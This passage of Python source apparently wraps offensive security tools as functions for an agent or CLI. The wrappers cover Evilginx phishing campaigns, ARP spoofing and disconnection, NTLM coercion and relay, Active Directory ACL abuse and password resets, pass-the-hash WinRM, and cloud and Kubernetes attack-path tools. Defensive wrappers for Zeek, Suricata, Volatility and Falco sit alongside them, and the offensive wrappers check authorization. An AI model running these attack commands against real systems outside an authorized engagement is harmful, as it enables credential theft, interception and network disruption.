        cmd = EG + ('D=$(dirname "$(readlink -f "$EG")"); '
                    'for d in /usr/share/evilginx*/phishlets "$D/phishlets" ./phishlets; do '
                    '[ -d "$d" ] && { echo "== $d =="; ls "$d" | sed "s/\\.yaml$//" | sort | column 2>/dev/null || ls "$d"; break; }; done')
    elif mode == "setup":
        if not (domain and phishlet):
            return ("aitm setup: give 'domain' (a phishing domain you control / are authorized "
                    "to use) and 'phishlet' (see mode=phishlets). Emits the campaign config "
                    "sequence; it does not launch the daemon or contact anyone.")
        seq = ("config domain " + domain + "\\n"
               "config ipv4 external <YOUR-VPS-IP>\\n"
               "phishlets hostname " + phishlet + " " + domain + "\\n"
               "phishlets enable " + phishlet + "\\n")
        return _off_report("aitm(setup)", "phishing:" + pauth[:24], "evilginx2 <config>", seq
                           + "\\nRun `evilginx2`, paste the above, then `aitm mode=lure phishlet="
                           + phishlet + "` for the URL. Only for authorized, in-scope recipients.",
                           0, "operator", domain)
    elif mode == "lure":
        if not phishlet:
            return "aitm lure: give 'phishlet'. Emits the lure-creation sequence."
        seq = ("lures create " + phishlet + "\\nlures get-url 0\\n")
        return _off_report("aitm(lure)", "phishing:" + pauth[:24], "evilginx2 <lure>", seq, 0, "operator", domain)
    elif mode == "sessions":
        # Report that captures exist WITHOUT dumping plaintext secrets into output.
        cmd = EG + ('DB=$(find / -name "data.db" -path "*evilginx*" 2>/dev/null | head -1); '
                    '[ -n "$DB" ] || { echo "no evilginx session DB found yet"; exit 0; }; '
                    'echo "session DB: $DB"; '
                    'strings "$DB" 2>/dev/null | grep -aoE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+" | sort -u | head -40 | '
                    'sed "s/\\(..\\).*@/\\1***@/"; '
                    'echo "-- capture markers (values redacted) --"; '
                    'strings "$DB" 2>/dev/null | grep -aciE "token|cookie|password" | sed "s/^/secret fields present: /"')
    elif mode == "status":
        cmd = EG + ('pgrep -a evilginx >/dev/null 2>&1 && echo "evilginx: RUNNING" || echo "evilginx: not running"; '
                    '(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | grep -E ":443|:80 " | head')
    else:
        return "aitm mode = phishlets | setup | lure | sessions | status."
    out, rc, where = _off_run(cmd, 120)
    if "EVILGINX_MISSING" in out:
        return ("aitm: Evilginx not installed — `sygnif kali-setup` (kali-tools-social-engineering "
                "ships evilginx2), or install it in the toolbox.")
    _audit("aitm(" + mode + ")", "phishing:" + pauth[:24], "aitm " + mode + " " + (domain or phishlet), rc, where, domain)
    return _def_report("aitm(" + mode + ")", "aitm " + mode, out or "(no output)", rc, where)





def tool_arp(args: dict) -> str:
    """ARP cache poisoning on an AUTHORIZED local segment (EONRaider/Arp-Spoofer, a
    zero-dependency pure-Python spoofer; shelled out, not vendored — AGPL stays
    separate). mode=mitm (bidirectional, sets ip_forward, keeps the victim online) |
    disassociate (cut the victim off — DISRUPTIVE / DoS-class, in-scope single target
    only). Runs bounded for `seconds` then restores ARP on exit. Needs target (victim IP
    on your segment) + authorization; SCOPE-confined; rate-limited; root (raw sockets)."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "mitm")).strip().lower()
    dur = str(int(str(args.get("seconds", "30")) or 30))
    opts = []
    iface = str(args.get("interface", "")).strip()
    if iface:
        opts.append("-i " + shlex.quote(iface))
    gate = str(args.get("gateway", "")).strip()
    if gate:
        opts.append("--gatewayip " + shlex.quote(gate))
    interval = str(args.get("interval", "")).strip()
    if interval:
        opts.append("--interval " + shlex.quote(interval))
    if mode == "mitm":
        opts.append("-f")
    elif mode in ("disassociate", "dos"):
        opts.append("-d")
    else:
        return "arp mode = mitm (MITM, victim stays online) | disassociate (cut victim off — disruptive)."
    # resolve the cloned spoofer; run bounded, SIGINT so its restore-on-exit re-ARPs.
    loc = ('P=$(ls /opt/arp-spoofer/arpspoof.py 2>/dev/null | head -1 || command -v arpspoof.py); '
           '[ -n "$P" ] || { echo ARPSPOOF_MISSING; exit 127; }; ')
    cmd = (loc + "timeout --signal=INT " + dur + " python3 \"$P\" " + " ".join(opts)
           + " " + shlex.quote(target) + " 2>&1 | tail -60; echo '[arp: run ended; tool restores the cache on exit]'")
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, int(dur) + 30))
    if "ARPSPOOF_MISSING" in out:
        return ("arp: EONRaider/Arp-Spoofer not present — `sygnif kali-setup` clones it to "
                "/opt/arp-spoofer, or: git clone https://github.com/EONRaider/Arp-Spoofer /opt/arp-spoofer")
    tag = "arp(" + mode + ")"
    if mode in ("disassociate", "dos"):
        out = "[DISRUPTIVE: this cut the target off the network for " + dur + "s — authorized single-target test only]\n" + out
    return _off_report(tag, args.get("authorization", ""), "arpspoof " + " ".join(opts) + " " + target, out, rc, where, target)


def tool_subenum(args: dict) -> str:
    """Passive subdomain / host enumeration via ReconLib (EONRaider/ReconLib, GPL —
    invoked as a subprocess, not vendored, so its copyleft stays separate). Unions
    subdomains from crt.sh Certificate Transparency logs and HackerTarget's passive
    DNS. Reads only public data (no packets to the target), but still SCOPE-gated the
    same as the other recon tools. Give domain (+ authorization)."""
    domain = str(args.get("domain", "") or args.get("target", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    d = _bare_host(domain)
    # resolve the provisioned runner; it imports reconlib in its OWN process (GPL firewall).
    loc = ('R=/opt/reconlib_run.py; [ -s "$R" ] || { echo RECONLIB_MISSING; exit 127; }; ')
    cmd = loc + "python3 \"$R\" " + shlex.quote(d) + " 2>&1 | head -300"
    out, rc, where = _off_run(cmd, 300)
    if "RECONLIB_MISSING" in out:
        return ("subenum: EONRaider/ReconLib not provisioned — `sygnif kali-setup` installs it "
                "and writes /opt/reconlib_run.py, or: pip install --break-system-packages reconlib")
    return _off_report("subenum", args.get("authorization", ""), "reconlib subenum " + d, out, rc, where, d)


def tool_sniff(args: dict) -> str:
    """DEFENSIVE packet capture + layer-by-layer decode with RootWire (EONRaider/RootWire,
    GPL — installed, not vendored): a pure-Python raw-socket sniffer that decodes Ethernet/
    ARP/IPv4/IPv6/ICMP/TCP/UDP and verifies every checksum, flagging mismatches inline (a
    real signal for spoofed/corrupt traffic). mode=pcap file=<path> (replay a capture, no
    root) | live interface=<if> (bounded by seconds, needs root). Optional filter= (canned
    arp|ip6|tcp|udp or a BPF-style expr). JSON output. Your own capture — no offensive gate."""
    mode = str(args.get("mode", "pcap")).strip().lower()
    filt = str(args.get("filter", "")).strip()
    fopt = (" --filter " + shlex.quote(filt)) if filt else ""
    if mode == "pcap":
        f = str(args.get("file", "")).strip()
        if not f:
            return "sniff pcap: give a 'file' (a .pcap/.pcapng to replay). (filter= is live-only.)"
        # rootwire: --filter is mutually exclusive with -r, so no fopt on replay.
        cmd = "rootwire -r " + shlex.quote(f) + " --json 2>&1 | head -300"
    elif mode == "live":
        iface = str(args.get("interface", "")).strip()
        if not iface:
            return "sniff live: give an 'interface' you own (e.g. eth0). Captures briefly then reports."
        dur = str(int(str(args.get("seconds", "20")) or 20))
        cmd = ("timeout " + dur + " rootwire -i " + shlex.quote(iface) + " --json" + fopt
               + " 2>&1 | head -300; echo '[sniff: capture window ended]'")
    else:
        return "sniff mode = pcap (file=, no root) | live (interface=, needs root). RootWire pure-Python decoder, JSON."
    out, rc, where = _def_run(cmd, 600, need=("rootwire",))
    return _def_report("sniff(" + mode + ")", "rootwire " + mode, out or "(no output)", rc, where)


def tool_coerce(args: dict) -> str:
    """Authentication coercion + NTLM relay for an AUTHORIZED AD engagement (Coercer +
    Impacket ntlmrelayx): the no-creds coerce->relay->ADCS/DCSync chain. mode=coerce
    (force a target to auth to your listener) | relay (stand up ntlmrelayx). Needs
    target (the host to coerce / relay to) + authorization + listener. SCOPE-confined."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "coerce")).strip().lower()
    listener = str(args.get("listener", "")).strip()
    t = shlex.quote(target)
    if mode == "coerce":
        if not listener:
            return "coerce: give a 'listener' (your relay/capture IP the target should auth to)."
        user = str(args.get("user", "")).strip(); pw = str(args.get("password", "")).strip()
        dom = str(args.get("domain", "")).strip()
        cred = ((" -u " + shlex.quote(user)) if user else "") + ((" -p " + shlex.quote(pw)) if pw else "") + ((" -d " + shlex.quote(dom)) if dom else "")
        cmd = ('C=$(command -v coercer || command -v Coercer); [ -n "$C" ] || { echo COERCER_MISSING; exit 127; }; '
               '"$C" coerce -t ' + t + " -l " + shlex.quote(listener) + cred + " 2>&1 | tail -80")
        miss, hint = "COERCER_MISSING", "Coercer (pip install coercer)"
    elif mode == "relay":
        relay_to = str(args.get("relay_to", "") or target).strip()
        extra = str(args.get("extra", "")).strip()
        cmd = ('B=$(command -v ntlmrelayx.py || command -v impacket-ntlmrelayx); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
               'echo "starting ntlmrelayx -t ' + shlex.quote(relay_to) + " " + extra + '"; timeout 5 "$B" -t ' + shlex.quote(relay_to) + " " + extra + " 2>&1 | tail -40 || true")
        miss, hint = "IMPACKET_MISSING", "impacket"
    else:
        return "coerce mode = coerce | relay. Needs an authorized target + listener."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 300))
    if miss in out:
        return "coerce: " + hint + " not installed — `sygnif kali-setup` or install it in the toolbox."
    return _off_report("coerce(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def tool_bloodyad(args: dict) -> str:
    """AD object / ACL abuse for an AUTHORIZED engagement (bloodyAD): turn a BloodHound
    edge into a privilege step. mode=whoami|get|dacl|addcomputer|shadow|setpassword.
    Needs target (DC) + authorization + domain/user/password (or hash). SCOPE-confined."""
    target = str(args.get("target", "") or args.get("dc", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "whoami")).strip().lower()
    dom = str(args.get("domain", "")).strip(); user = str(args.get("user", "")).strip()
    pw = str(args.get("password", "")).strip(); nthash = str(args.get("hash", "")).strip()
    obj = str(args.get("object", "")).strip(); trustee = str(args.get("trustee", "")).strip()
    base = ('B=$(command -v bloodyAD || command -v bloodyad); [ -n "$B" ] || { echo BLOODYAD_MISSING; exit 127; }; '
            '"$B" --host ' + shlex.quote(target) + " -d " + shlex.quote(dom) + " -u " + shlex.quote(user)
            + ((" -p " + shlex.quote(pw)) if pw else (" -p :" + shlex.quote(nthash) if nthash else "")) + " ")
    if mode == "whoami":
        act = "get object " + shlex.quote(user)
    elif mode == "get":
        act = "get writable" if not obj else "get object " + shlex.quote(obj)
    elif mode == "dacl":
        act = "add genericAll " + shlex.quote(obj) + " " + shlex.quote(trustee)
    elif mode == "addcomputer":
        act = "add computer " + shlex.quote(obj or "SYGNIFPC$") + " " + shlex.quote(pw or "Sygnif123!")
    elif mode == "shadow":
        act = "add shadowCredentials " + shlex.quote(obj or user)
    elif mode == "setpassword":
        act = "set password " + shlex.quote(obj) + " " + shlex.quote(str(args.get("new_password", "Sygnif123!")))
    else:
        return "bloodyad mode = whoami|get|dacl|addcomputer|shadow|setpassword."
    cmd = base + act + " 2>&1 | tail -80"
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 300))
    if "BLOODYAD_MISSING" in out:
        return "bloodyad: bloodyAD not installed — `pip install bloodyAD` or `sygnif kali-setup`."
    return _off_report("bloodyad(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def tool_winrm(args: dict) -> str:
    """Interactive-style WinRM on an AUTHORIZED Windows host (evil-winrm). mode=exec
    runs one command; mode=connect emits the interactive connect string. Creds via
    user/password or user/hash (pass-the-hash). Needs target + authorization."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "exec")).strip().lower()
    user = str(args.get("user", "")).strip(); pw = str(args.get("password", "")).strip()
    nthash = str(args.get("hash", "")).strip()
    if not user:
        return "winrm: needs 'user' and a 'password' or NTLM 'hash'."
    auth = "-u " + shlex.quote(user) + ((" -p " + shlex.quote(pw)) if pw else (" -H " + shlex.quote(nthash) if nthash else ""))
    conn = 'E=$(command -v evil-winrm); [ -n "$E" ] || { echo WINRM_MISSING; exit 127; }; "$E" -i ' + shlex.quote(target) + " " + auth
    if mode == "connect":
        return _off_report("winrm(connect)", args.get("authorization", ""),
                           "evil-winrm -i " + target + " " + auth,
                           "Run interactively:\n  evil-winrm -i " + target + " " + auth
                           + "\n(interactive shell + file up/download + AMSI/script load)", 0, "operator", target)
    if mode == "exec":
        command = str(args.get("command", "whoami")).strip()
        cmd = 'printf %s\\\\n ' + shlex.quote(command) + " " + shlex.quote("exit") + " | " + conn + " 2>&1 | tail -60"
    else:
        return "winrm mode = exec | connect."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 200))
    if "WINRM_MISSING" in out:
        return "winrm: evil-winrm not installed — `gem install evil-winrm` or `sygnif kali-setup`."
    return _off_report("winrm(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def tool_cloudx(args: dict) -> str:
    """OFFENSIVE cloud for an AUTHORIZED engagement (the active sibling of the defensive
    cloud_audit). mode=aws (Pacu), azure (ROADrecon), azuread (AzureHound collect).
    Uses cloud creds from the environment. Needs target (account/tenant id) +
    authorization. Enumerates IAM/attack paths — does not modify by default."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "aws")).strip().lower()
    if mode == "aws":
        cmds = str(args.get("commands", "iam__enum_permissions,iam__privesc_scan")).strip()
        cmd = ('P=$(command -v pacu); [ -n "$P" ] || { echo PACU_MISSING; exit 127; }; '
               'echo "run in pacu: import_keys --all; then: ' + cmds + '" ; "$P" --help >/dev/null 2>&1 && echo "pacu present" || echo PACU_MISSING')
        miss, hint = "PACU_MISSING", "Pacu (pip install pacu)"
    elif mode == "azure":
        cmd = ('R=$(command -v roadrecon); [ -n "$R" ] || { echo ROAD_MISSING; exit 127; }; '
               '"$R" gather 2>&1 | tail -40')
        miss, hint = "ROAD_MISSING", "ROADtools (pip install roadrecon)"
    elif mode == "azuread":
        cmd = ('A=$(command -v azurehound); [ -n "$A" ] || { echo AZHOUND_MISSING; exit 127; }; '
               '"$A" -o /tmp/azurehound.json list 2>&1 | tail -30')
        miss, hint = "AZHOUND_MISSING", "AzureHound"
    else:
        return "cloudx mode = aws (Pacu) | azure (ROADrecon) | azuread (AzureHound)."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 600))
    if miss in out:
        return "cloudx: " + hint + " not installed."
    return _off_report("cloudx(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def tool_kube(args: dict) -> str:
    """OFFENSIVE Kubernetes for an AUTHORIZED engagement. mode=hunt (kube-hunter remote
    scan), rbac (kubectl auth can-i --list, from a foothold token), enum (peirates
    guidance). Needs target (API server / cluster) + authorization."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "hunt")).strip().lower()
    t = shlex.quote(target)
    if mode == "hunt":
        cmd = ('K=$(command -v kube-hunter); [ -n "$K" ] || { echo KH_MISSING; exit 127; }; '
               '"$K" --remote ' + t + " 2>&1 | tail -80")
        miss, hint = "KH_MISSING", "kube-hunter (pip install kube-hunter)"
    elif mode == "rbac":
        cmd = ('command -v kubectl >/dev/null 2>&1 || { echo KUBECTL_MISSING; exit 127; }; '
               'kubectl auth can-i --list 2>&1 | head -60')
        miss, hint = "KUBECTL_MISSING", "kubectl"
    elif mode == "enum":
        cmd = ('P=$(command -v peirates); [ -n "$P" ] || { echo PEIRATES_MISSING; exit 127; }; '
               'echo "peirates present — run interactively from the pod foothold"; "$P" --help 2>&1 | head -20')
        miss, hint = "PEIRATES_MISSING", "peirates"
    else:
        return "kube mode = hunt | rbac | enum. Needs an authorized cluster/API target."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 600))
    if miss in out:
        return "kube: " + hint + " not installed."
    return _off_report("kube(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def tool_emulate(args: dict) -> str:
    """Adversary emulation / detection validation (Atomic Red Team) on an AUTHORIZED
    host: fire a single ATT&CK technique, then check whether detect/triage/netmon see
    it. mode=list (techniques) | run (technique=Txxxx) | cleanup. EXECUTES attack
    behaviour, so it needs target (the authorized host, e.g. localhost) + authorization."""
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "list")).strip().lower()
    tech = str(args.get("technique", "")).strip()
    AO = 'A=$(command -v atomic-operator || command -v invoke-atomicredteam); [ -n "$A" ] || { echo ATOMIC_MISSING; exit 127; }; '
    if mode == "list":
        cmd = AO + '"$A" --help 2>&1 | head -30; echo "specify technique=T1059 etc for run"'
    elif mode == "run":
        if not tech:
            return "emulate run: give a 'technique' (ATT&CK id, e.g. T1059.004)."
        cmd = AO + '"$A" run --techniques ' + shlex.quote(tech) + " 2>&1 | tail -80"
    elif mode == "cleanup":
        if not tech:
            return "emulate cleanup: give the 'technique' to clean up."
        cmd = AO + '"$A" run --techniques ' + shlex.quote(tech) + " --cleanup 2>&1 | tail -40"
    else:
        return "emulate mode = list | run | cleanup (Atomic Red Team). Validate your detections."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 400))
    if "ATOMIC_MISSING" in out:
        return ("emulate: Atomic Red Team runner not installed — `pip install atomic-operator` "
                "(or the Invoke-AtomicRedTeam PowerShell module) + clone the atomics.")
    return _off_report("emulate(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)


def _velo_live_cmd(mode: str, ds: str) -> str:
    """Shell to start/stop/status a self-contained live Velociraptor GUI server
    (server + GUI + local client all-in-one, GUI on 127.0.0.1:8889). Datastore in a
    persistent path so it survives a container recreate. Shared by triage (defensive)
    and velociraptor (offensive)."""
    dsq = shlex.quote(ds)
    V = 'command -v velociraptor >/dev/null 2>&1 || { echo VELO_MISSING; exit 127; }; '
    # detect the running server by the binary process (pgrep -x, NOT -f: an -f pattern
    # of "velociraptor gui" self-matches this very shell command) and the GUI port.
    up = "pgrep -x velociraptor >/dev/null 2>&1"
    if mode == "start":
        return (V + "mkdir -p " + dsq + "; "
                "if " + up + "; then echo 'already running'; else "
                "setsid bash -c 'exec velociraptor gui --datastore " + dsq + " >> " + dsq + "/gui.log 2>&1' </dev/null & "
                "sleep 12; fi; "
                "echo '=== GUI 127.0.0.1:8889 ==='; (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | grep 8889 || echo 'port not up yet — check the log'; "
                "echo '=== credentials / log tail ==='; tail -12 " + dsq + "/gui.log 2>/dev/null | grep -aiE 'username|password|gui is now|admin|error|listen' || tail -6 " + dsq + "/gui.log 2>/dev/null")
    if mode == "status":
        return (V + "if " + up + "; then pgrep -ax velociraptor | head -2; else echo 'not running'; fi; "
                "(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | grep 8889 || echo 'no :8889'")
    if mode == "stop":
        return "pkill -x velociraptor && echo 'stopped live Velociraptor' || echo 'not running'"
    return ""


def tool_velociraptor(args: dict) -> str:
    """OFFENSIVE Velociraptor for an AUTHORIZED engagement: post-exploitation data
    collection and VQL execution against a foothold you hold, plus offline-collector
    generation to drop on an authorized target. The offensive sibling of `triage`
    (which is defensive IR on hosts you own). Requires target (the authorized host /
    foothold) + authorization; SCOPE.md-confined; audited. mode = query | collect |
    offline | hunt. VQL is powerful (reads files, enumerates, can exec) — in scope only."""
    target = str(args.get("target", "") or args.get("host", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "collect")).strip().lower()
    VELO = ('V=$(command -v velociraptor || command -v velociraptor-client); '
            '[ -n "$V" ] || { echo VELO_MISSING; exit 127; }; ')
    if mode in ("live", "start", "stop", "status"):
        sub = "start" if mode == "live" else mode
        ds = os.path.expanduser(os.environ.get("SYGNIF_PY_VELO_DIR", "/var/lib/sygnif/velociraptor"))
        out, rc, where = _off_run(_velo_live_cmd(sub, ds), 120)
        if "VELO_MISSING" in out:
            return "velociraptor: not installed — velociraptor.app/downloads or `sygnif kali-setup`."
        return _off_report("velociraptor(live:" + sub + ")", args.get("authorization", ""),
                           "velociraptor gui " + sub, out, rc, where, target)
    if mode == "query":
        vql = str(args.get("query", "")).strip()
        if not vql:
            return ("velociraptor query: give a VQL 'query', e.g. "
                    "\"SELECT * FROM info()\" or a FileFinder/credential artifact query.")
        cmd = VELO + '"$V" --nobanner query ' + shlex.quote(vql) + " 2>&1 | tail -160"
    elif mode == "collect":
        art = str(args.get("artifact", "Generic.Client.Info")).strip()
        cmd = VELO + '"$V" --nobanner artifacts collect ' + shlex.quote(art) + " 2>&1 | tail -160"
    elif mode == "offline":
        art = str(args.get("artifact", "Generic.Client.Info")).strip()
        cmd = (VELO + 'OUT=/tmp/velo_offline_$$; "$V" --nobanner collector '
               '--output "$OUT.zip" ' + shlex.quote(art) + " >/dev/null 2>&1; "
               'ls -la "$OUT"* 2>/dev/null && echo "drop the collector on the authorized target, run it, retrieve the zip" '
               '|| echo "offline collector build needs a config: velociraptor config generate"')
    elif mode == "hunt":
        vql = str(args.get("query", "")).strip()
        if not vql:
            return ("velociraptor hunt: fleet-wide, needs a server API config and a VQL 'query'. "
                    "Point at the engagement's Velociraptor server (config in the toolbox).")
        cfg = str(args.get("config", "")).strip()
        capi = ("--api_config " + shlex.quote(cfg) + " ") if cfg else ""
        cmd = VELO + '"$V" --nobanner ' + capi + "query " + shlex.quote(vql) + " 2>&1 | tail -160"
    else:
        return "velociraptor mode = query | collect | offline | hunt. Offensive post-ex on an authorized foothold."
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
    if "VELO_MISSING" in out:
        return ("velociraptor: not installed — single binary from velociraptor.app/downloads "
                "(put it on PATH as 'velociraptor'), or `sygnif kali-setup`.")
    return _off_report("velociraptor(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)



def tool_netmon(args: dict) -> str:
    """DEFENSIVE network detection: run Zeek (traffic->structured logs) and Suricata
    (signature IDS) over a PCAP or an interface you own. mode=pcap file=<path> |
    live interface=<if>. Analysis of your own capture — no offensive gate."""
    mode = str(args.get("mode", "pcap")).strip().lower()
    if mode == "pcap":
        f = str(args.get("file", "")).strip()
        if not f:
            return "netmon pcap: give a 'file' (a .pcap you captured)."
        q = shlex.quote(f)
        cmd = ('echo "== zeek =="; Z=$(command -v zeek); [ -n "$Z" ] && (cd /tmp && "$Z" -r ' + q
               + ' 2>&1 | tail -20; echo "conn/dns/http/ssl logs in /tmp") || echo "(zeek not installed)"; '
               'echo "== suricata =="; S=$(command -v suricata); [ -n "$S" ] && "$S" -r ' + q
               + ' -l /tmp 2>&1 | tail -8 && grep -h alert /tmp/fast.log 2>/dev/null | tail -40 || echo "(suricata not installed)"')
    elif mode == "live":
        iface = str(args.get("interface", "")).strip()
        if not iface:
            return "netmon live: give an 'interface' you own (e.g. eth0). Captures briefly then reports."
        dur = str(int(str(args.get("seconds", "20")) or 20))
        q = shlex.quote(iface)
        cmd = ('S=$(command -v suricata); [ -n "$S" ] || { echo "suricata not installed"; exit 127; }; '
               'timeout ' + dur + ' "$S" -i ' + q + ' -l /tmp 2>&1 | tail -6; grep -h alert /tmp/fast.log 2>/dev/null | tail -40 || echo "(no alerts)"')
    else:
        return "netmon mode = pcap (file=) | live (interface=). Zeek + Suricata."
    out, rc, where = _def_run(cmd, 600)
    return _def_report("netmon(" + mode + ")", "netmon " + mode, out or "(no output)", rc, where)


def tool_memforensics(args: dict) -> str:
    """DEFENSIVE memory forensics with Volatility3 on a memory image you captured.
    Catches fileless / in-memory implants on-disk YARA misses. Give 'file' (the dump)
    and optional 'plugin' (default pslist). No offensive gate."""
    f = str(args.get("file", "")).strip()
    if not f:
        return "memforensics: give a 'file' (a memory dump). Optional plugin= (pslist|netscan|malfind|...)."
    plugin = str(args.get("plugin", "windows.pslist")).strip()
    q = shlex.quote(f); pg = shlex.quote(plugin)
    cmd = ('V=$(command -v vol || command -v vol.py || command -v volatility3); '
           '[ -n "$V" ] || { echo VOL_MISSING; exit 127; }; '
           '"$V" -f ' + q + " " + pg + " 2>&1 | tail -120")
    out, rc, where = _def_run(cmd, 900)
    if "VOL_MISSING" in out:
        return "memforensics: Volatility3 not installed — `pipx install volatility3` or `sygnif kali-setup`."
    return _def_report("memforensics(" + plugin + ")", "vol -f <dump> " + plugin, out or "(no output)", rc, where)


def tool_falco(args: dict) -> str:
    """DEFENSIVE runtime EDR (Falco, eBPF): live syscall detection of priv-esc,
    unexpected exec, container escape. mode=status | rules (validate) | run (short
    live capture; needs root/eBPF). Analysis of this host — no offensive gate."""
    mode = str(args.get("mode", "status")).strip().lower()
    F = 'F=$(command -v falco); [ -n "$F" ] || { echo FALCO_MISSING; exit 127; }; '
    if mode == "status":
        cmd = F + '"$F" --version 2>&1 | head -3; systemctl is-active falco 2>/dev/null || echo "falco service: not running (run mode=run for a short live capture)"'
    elif mode == "rules":
        cmd = F + '"$F" -V /etc/falco/falco_rules.yaml 2>&1 | tail -20'
    elif mode == "run":
        dur = str(int(str(args.get("seconds", "20")) or 20))
        cmd = F + 'timeout ' + dur + ' "$F" -o json_output=true 2>&1 | grep -iE "warning|error|critical|notice" | tail -40 || echo "(no events in window)"'
    else:
        return "falco mode = status | rules | run."
    out, rc, where = _def_run(cmd, 120)
    if "FALCO_MISSING" in out:
        return "falco: not installed — single-binary/install from falco.org (needs eBPF/root for live)."
    return _def_report("falco(" + mode + ")", "falco " + mode, out or "(no output)", rc, where)


def tool_wazuh(args: dict) -> str:
    """DEFENSIVE SIEM query (Wazuh API): pull agents or recent alerts from a Wazuh
    manager. mode=agents | alerts. Reads WAZUH_API_URL / WAZUH_API_USER /
    WAZUH_API_PASSWORD from the environment. No offensive gate."""
    mode = str(args.get("mode", "agents")).strip().lower()
    url = os.environ.get("WAZUH_API_URL", "").strip()
    if not url:
        return ("wazuh: set WAZUH_API_URL (+ WAZUH_API_USER / WAZUH_API_PASSWORD) in the "
                "environment to reach your Wazuh manager API.")
    path = "/agents?limit=50" if mode == "agents" else "/security/user/authenticate"
    if mode not in ("agents", "alerts"):
        return "wazuh mode = agents | alerts."
    cmd = ('U=' + shlex.quote(url) + '; '
           'T=$(curl -sk -u "$WAZUH_API_USER:$WAZUH_API_PASSWORD" -X POST "$U/security/user/authenticate?raw=true" 2>/dev/null); '
           '[ -n "$T" ] || { echo "auth failed — check WAZUH_API_* env"; exit 1; }; '
           + ('curl -sk -H "Authorization: Bearer $T" "$U/agents?limit=50&select=name,ip,status,os.name" 2>/dev/null | head -c 4000'
              if mode == "agents" else
              'curl -sk -H "Authorization: Bearer $T" "$U/manager/logs?limit=50" 2>/dev/null | head -c 4000'))
    out, rc, where = _def_run(cmd, 60)
    return _def_report("wazuh(" + mode + ")", "wazuh api " + mode, out or "(no output)", rc, where)


def tool_intel(args: dict) -> str:
    """Threat-intel / IOC enrichment: turn a hash, IP, or domain into a verdict via
    VirusTotal, AlienVault OTX, and MISP. Auto-detects the IOC type. Keys from env
    (VT_API_KEY, OTX_API_KEY, MISP_URL/MISP_KEY). Read-only lookup, no gate."""
    ioc = str(args.get("ioc", "") or args.get("indicator", "")).strip()
    if not ioc:
        return "intel: give an 'ioc' — a hash, IP, or domain to enrich."
    import re as _re
    if _re.fullmatch(r"[a-fA-F0-9]{32,64}", ioc):
        kind, vt = "file", "files/" + ioc
    elif _re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", ioc):
        kind, vt = "ip", "ip_addresses/" + ioc
    else:
        kind, vt = "domain", "domains/" + ioc
    out_lines = []
    vt_key = os.environ.get("VT_API_KEY", "").strip()
    if vt_key:
        body, st, _ = _http_get("https://www.virustotal.com/api/v3/" + vt, headers={"x-apikey": vt_key})
        if st == 200:
            try:
                a = json.loads(body).get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                out_lines.append("VirusTotal: malicious=%s suspicious=%s harmless=%s" % (a.get("malicious"), a.get("suspicious"), a.get("harmless")))
            except Exception:
                out_lines.append("VirusTotal: (unparseable response)")
        else:
            out_lines.append("VirusTotal: HTTP " + str(st))
    else:
        out_lines.append("VirusTotal: set VT_API_KEY to enable")
    otx_key = os.environ.get("OTX_API_KEY", "").strip()
    if otx_key:
        seg = {"file": "file", "ip": "IPv4", "domain": "domain"}[kind]
        body, st, _ = _http_get("https://otx.alienvault.com/api/v1/indicators/%s/%s/general" % (seg, ioc), headers={"X-OTX-API-KEY": otx_key})
        if st == 200:
            try:
                p = json.loads(body).get("pulse_info", {}).get("count", 0)
                out_lines.append("OTX: %s pulse(s) reference this indicator" % p)
            except Exception:
                out_lines.append("OTX: (unparseable)")
        else:
            out_lines.append("OTX: HTTP " + str(st))
    else:
        out_lines.append("OTX: set OTX_API_KEY to enable")
    if os.environ.get("MISP_URL", "").strip():
        out_lines.append("MISP: configured (MISP_URL set) — query via your MISP instance")
    return "intel enrichment for " + ioc + " (" + kind + "):\n  " + "\n  ".join(out_lines)


def tool_triage(args: dict) -> str:
    """Live endpoint IR triage & hunting with Velociraptor on a host you are
    responding to (DEFENSIVE — the blue mirror of the offensive suite). mode=collect
    runs a triage artifact collection, mode=hunt runs a VQL query, mode=artifacts
    lists available artifacts. Read/response analysis of a host you own or are
    authorized to respond on — no offensive target/authorization gate."""
    mode = str(args.get("mode", "collect")).strip().lower()
    VELO = ('V=$(command -v velociraptor || command -v velociraptor-client); '
            '[ -n "$V" ] || { echo VELO_MISSING; exit 127; }; ')
    if mode in ("live", "start", "stop", "status"):
        sub = "start" if mode == "live" else mode
